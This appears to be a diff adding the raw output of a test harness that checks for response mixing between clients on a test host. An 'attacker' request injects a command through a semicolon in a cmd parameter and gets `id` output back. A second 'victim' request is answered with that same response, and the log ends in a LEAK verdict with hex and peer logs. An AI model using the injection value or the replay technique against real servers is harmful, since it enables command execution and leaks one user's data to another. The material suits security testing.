@@ -1,0 +1,46 @@
+CONTROL (same config): HTTP/1.1 200 OK
+
+--- REQUEST 1 (attacker) raw ---
+GET /api/exec?cmd=id%3BATTACKER&rp=1 HTTP/1.1
+Host: alpha.test
+Connection: close
+
+
+--- REQUEST 2 (victim) raw ---
+GET /api/victim?SECOND HTTP/1.1
+Host: alpha.test
+Connection: close
+
+
+--- CLIENT BYTES FOR REQUEST 1 ---
+HTTP/1.1 200 OK
+Content-Length: 225
+Connection: close
+content-type: text/plain
+x-counter: 2
+x-sock: 1
+x-port: 42125
+
+CTR=2 SOCK=1 PORT=42125 PID=4055129 TOKS=3
+LINE:GET //exec?cmd=id%3BATTACKER&rp=1 HTTP/1.1
+EXEC:uid=1000(mouse9911) gid=1000(mouse9911) groups=1000(mouse9911),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),101(lxd)
+
+--- CLIENT BYTES FOR REQUEST 2 ---
+HTTP/1.1 200 OK
+Content-Length: 225
+Connection: close
+content-type: text/plain
+x-counter: 2
+x-sock: 1
+x-port: 42125
+
+CTR=2 SOCK=1 PORT=42125 PID=4055129 TOKS=3
+LINE:GET //exec?cmd=id%3BATTACKER&rp=1 HTTP/1.1
+EXEC:uid=1000(mouse9911) gid=1000(mouse9911) groups=1000(mouse9911),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),101(lxd)
+
+--- REQUEST 2 HEX ---
+485454502f312e3120323030204f4b0d0a436f6e74656e742d4c656e6774683a203232350d0a436f6e6e656374696f6e3a20636c6f73650d0a636f6e74656e742d747970653a20746578742f706c61696e0d0a782d636f756e7465723a20320d0a782d736f636b3a20310d0a782d706f72743a2034323132350d0a0d0a4354523d3220534f434b3d3120504f52543d3432313235205049443d3430353531323920544f4b533d330a4c494e453a474554202f2f657865633f636d643d696425334241545441434b45522672703d3120485454502f312e310a455845433a7569643d31303030286d6f7573653939313129206769643d31303030286d6f75736539393131292067726f7570733d31303030286d6f75736539393131292c342861646d292c3234286364726f6d292c3237287375646f292c333028646970292c343628706c7567646576292c313030287573657273292c313031286c7864290a
+
+VERDICT: LEAK - request 2 answered with request 1's response
+--- PEER LOG ---
+0.0569 accept sock=10.0588 sock=1 ctr_pending line='GET //hello.txt HTTP/1.1'0.0589 sock=1 answered ctr=1 mode=hello.txt0.0591 sock=1 ctr_pending line='GET //exec?cmd=id%3BATTACKER&rp=1 HTTP/1.1'0.0657 sock=1 answered ctr=2 mode=exec0.0661 sock=1 ctr_pending line='GET //victim?SECOND HTTP/1.1'0.0661 sock=1 REPLAYED previous ctr=2 before answering new line0.0661 sock=1 answered ctr=3 mode=victim
